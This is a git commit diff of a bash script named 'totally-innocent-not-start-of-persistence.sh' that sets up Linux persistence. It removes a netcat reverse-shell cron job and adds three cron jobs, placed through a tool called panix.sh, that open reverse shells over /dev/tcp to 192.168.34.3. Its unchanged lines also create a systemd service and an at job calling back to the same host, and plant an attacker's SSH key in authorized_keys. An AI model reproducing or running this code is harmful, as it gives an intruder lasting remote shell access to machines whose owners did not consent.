e92b8ea45c451ff1207761cf2754a74ef5b68b60
Graymos <142538040+Graymos@users.noreply.github.com>
2024-11-05 13:02:19 -0600

    Crontab edit

--- totally-innocent-not-start-of-persistence.sh
+++ totally-innocent-not-start-of-persistence.sh
@@ -1,25 +1,7 @@
 #!/bin/bash
  
- 
-#Reverse shell cron job
-KEEP_ME_SCRIPT="$HOME/Documents/keep-me.sh"
- 
-if [ -f "$KEEP_ME_SCRIPT" ]; then
-    bash "$KEEP_ME_SCRIPT"
- 
-else
-echo '#!/bin/bash
-CRON_JOB="* * * * * mkfifo /tmp/p; nc 192.168.34.3 4444 0</tmp/p | /bin/bash > /tmp/p 2>&1; rm /tmp/p"
-(crontab -l 2>/dev/null | grep -q "$CRON_JOB") || {
-    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
-}' | > "$KEEP_ME_SCRIPT"
- 
-chmod +x "$KEEP_ME_SCRIPT"
- 
-fi
- 
 # Service creation
-bash /tmp/totally-innocent/panix.sh -q --systemd --default --ip 192.168.34.3 --port 4445 >/dev/null
+bash /tmp/totally-innocent/panix.sh -q --systemd --default --ip 192.168.34.3 --port 4445 >/dev/null 
  
 # at job creation
 bash /tmp/totally-innocent/panix.sh -q --at --default --ip 192.168.34.3 --port 4446 --time "now + 24 hours" >/dev/null
@@ -27,3 +9,10 @@ bash /tmp/totally-innocent/panix.sh -q --at --default --ip 192.168.34.3 --port 4
 # authorized_keys persistence
 bash /tmp/totally-innocent/panix.sh -q --authorized-keys --default --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" >/dev/null
 echo "test"
+
+#cron   
+bash /tmp/totally-innocent/panix.sh --cron --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4447 0>&1'" --daily --name "evil_cron_job" >/dev/null
+ 
+bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4448 0>&1'" --crond --name "evil_cron_job" >/dev/null
+ 
+bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4449 0>&1'" --crontab >/dev/null
